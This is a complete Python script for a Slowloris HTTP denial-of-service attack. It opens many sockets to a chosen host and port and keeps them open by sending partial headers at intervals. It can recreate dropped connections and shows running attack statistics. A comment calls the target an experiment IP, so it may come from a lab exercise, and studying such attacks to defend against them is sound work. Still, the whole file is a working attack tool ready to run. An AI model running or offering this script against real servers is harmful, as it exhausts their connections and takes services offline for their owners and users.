#!/usr/bin/env python3
import argparse
import socket
import time
import os
from datetime import datetime

parser = argparse.ArgumentParser(description="Slowloris HTTP DoS")
parser.add_argument("--h", required=True, type=str, help="Target host") #Experiment target IP
parser.add_argument("--p", default=80, type=int, help="Target port") #HTTP specific attack (Default HTTP port = 80)
parser.add_argument("--s", default=150, type=int, help="Amount of attacking sockets") #Default MaxRequestWorker value = 400; https://httpd.apache.org/docs/2.4/mod/mpm_common.html#maxrequestworkers
parser.add_argument("--d", default=10, type=int, help="Delay between partial headers") #Delay between sending partial headers, keeping connections alive
parser.add_argument("--r", action='store_true', help="Recreate failing sockets") #Recreate failing sockets
args = parser.parse_args()

host = args.h
port = args.p
n = args.s
t = args.d
r = args.r

def InitializeSocket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    request = b"GET / HTTP/1.1\r\n"
    s.send(request)
    return s

def main():
    #Initializing variables
    sockets = []
    listOfRecs = []
    totalRecs = 0
    totalFails = 0
    dropped = 0
    startTime = datetime.now()

    #Initializing sockets (and connections)
    for i in range(n):
        try:
            s = InitializeSocket()
            sockets.append(s)
        except:
            break

    #Keep attacking
    while True:
        currentTime = datetime.now()
        try:
            #Send partial headers for every socket. If this fails, remove the failing socket, increment dropped and track droptimes.
            for socket in sockets:
                try:
                    socket.send(b"Bogus-header: Nonsense\r\n")
                except:
                    sockets.remove(socket)
                    dropped += 1

            #If sockets are missing, recreate n-len(sockets) sockets and increment recreated. If this fails, increment failed.   
            if r: 
                recSuccesses = 0
                recFails = 0
                for i in range(n-len(sockets)):
                    try:
                        s = InitializeSocket()
                        sockets.append(s)
                        recSuccesses += 1
                    except:
                        recFails += 1
                recTime = datetime.now().strftime("%H:%M:%S")
                listOfRecs.append("{}\t{}\t\t{}".format(recTime, recSuccesses, recFails))
                totalRecs += recSuccesses
                totalFails += recFails

            #Clear console
            os.system('cls' if os.name == 'nt' else 'clear')

            #Calculate elapsed time
            elapsed = round((currentTime-startTime).total_seconds())

            #Print stats
            print("--INFORMATION--")
            print("Start-time of attack:            {}".format(startTime.strftime("%H:%M:%S")))
            print("Target:                          {}:{}".format(host, port))
            print("Amount of initial sockets:       {}".format(n))
            print("Delay between partial headers:   {}".format(t))
            print("Seconds elapsed:                 {}".format(elapsed))
            print("--SOCKET STATUS--")
            print("Amount of current sockets:       {}".format(len(sockets)))
            print("Amount of dropped sockets:       {}".format(dropped))
            if r:
                print("-Socket recreation-")
                print("Total recreated: {}".format(totalRecs))
                print("Total failed: {}".format(totalFails))
                print("  Time      Recreated        Failed")
                for recSocket in listOfRecs:
                    print(recSocket)
            time.sleep(t)

        #Stop the entire program if Ctrl+C is pressed.
        except (KeyboardInterrupt):
            stopTime = datetime.now()
            elapsed = round((stopTime-startTime).total_seconds())
            print("Slowloris manually interrupted at time {} after {} seconds.".format(stopTime.strftime("%H:%M:%S"), elapsed))
            break

#Run main method as default
if __name__ == "__main__":
    main()